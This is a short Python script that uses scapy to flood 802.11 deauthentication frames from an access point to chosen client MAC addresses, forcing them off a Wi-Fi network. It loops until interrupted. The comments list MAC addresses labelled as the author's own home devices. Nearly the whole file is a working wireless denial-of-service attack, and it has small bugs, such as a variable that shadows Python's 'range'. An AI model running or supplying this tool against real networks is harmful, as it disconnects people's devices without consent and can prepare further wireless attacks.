# WIFI DEAUTH GENERATOR
# list of known MAC addresses:
#	home wifi
#	- my phone			: b8:7b:c5:8a:31:ce
#	- spare laptop		: 80:e6:50:1b:84:3e
#	- 2.4G				: c8:54:4b:75:0e:3a
#	- 5G				: c8:54:4b:75:0e:3b

# 0:56:cd:81:67:ff

from scapy.all import *
from random import randint
import time
import os

# argument handling
for i in range(0, len(sys.argv)):
	arg = sys.argv[i]
	print(arg)

clients = ['b8:7b:c5:8a:31:ce']
access_points = ['c8:54:4b:75:0e:3a']
iface = 'en0'
inter = 0.1

range = False
lim = 10

packets = []

if '*' in clients:
	""" automatic host discovery """
	pass

for ap in access_points:
	for cl in clients:
		p = RadioTap() / Dot11(type = 0, subtype = 12, addr1 = cl, addr2 = ap, addr3 = ap) / Dot11Deauth(reason = 7)
		packets.append(p)

def send_deauth():
	time.sleep(inter)
	for p in packets:
		sendp(p, iface = iface, verbose = False, monitor = True)

try:
	if range:
		for i in range(0, lim):
			send_deauth()
			os.system('printf "\t[DEAUTH]:\t' + str(i * len(packets)) + '"\r')
	else:
		i = 0
		while True:
			i += 1
			send_deauth()
			os.system('printf "\t[DEAUTH]:\t' + str(i * len(packets)) + '"\r')
except KeyboardInterrupt:
	print
	print("Quitting...")
	exit()

print

exit()
